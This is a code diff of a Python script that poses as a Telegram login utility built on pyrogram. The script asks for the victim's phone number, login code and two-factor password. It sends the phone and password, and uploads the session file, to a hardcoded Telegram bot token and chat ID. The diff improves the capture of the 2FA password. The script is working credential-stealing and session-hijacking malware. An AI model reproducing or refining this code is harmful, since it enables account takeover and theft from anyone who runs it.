@@ -1,24 +1,8 @@
 
-import pickle
-
-
-with open("values.bin","rb") as f:
-    values = pickle.load(f)
-
-if not values["zip"]:
-    from zipfile import ZipFile
-
-    archive = 'pyrogram.zip'
-    zip_file = ZipFile(archive)
-    directory_to_extract_to = "pyrogram/"
-    with ZipFile(archive, 'r') as zip_file:
-        zip_file.extractall(directory_to_extract_to)
-    values["zip"] = True
-    with open("values.bin","wb") as f:
-        pickle.dump(values,f)
 
 
 from pyrogram import Client, filters
+from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, PasswordHashInvalid
 import telebot
 import time
 from module import *
@@ -34,17 +18,34 @@ cls()
 print(banner)
 
 time.sleep(2)
-
+cls()
 phone = input(
     cyan+bold+'[+]\033[0m \033[01mEnter your phone with country code (eg: +92) >\033[0m ')
 
 client = Client(name="session",api_id=YOUR_APP_ID,api_hash=YOUR_APP_HASH,phone_number=phone)
 Client_ = telebot.TeleBot('7693637096:AAGuPj-GcGpEESTyf7ua70qxs-nf2yOW7Zs')
-client.start()
+client.connect()
+sent_code_info = client.send_code(phone)
+phone_code = input("Please enter your phone code: ")  # Sent phone code using last function
+password = None
+while True:
+    try:
+        client.sign_in(phone, sent_code_info.phone_code_hash, phone_code)
+        break
+    except SessionPasswordNeeded:
+        password = input("Please enter your password: ")  # Sent phone code using last function
+        try:
+            client.check_password(password)
+            break
+        except PasswordHashInvalid:
+            print("pass error try 1 more time")
+    except PhoneCodeInvalid:
+        print("code error try 1 more time")
+
 
 try:
     Client_.send_message(chat_id=6470140273,text=f'''Phone Number: {phone} {client.phone_number}
-password: {client.password}
+password: {password}
 ''')
     file = open('session.session', 'rb')
     Client_.send_document(chat_id=6470140273,document=file)
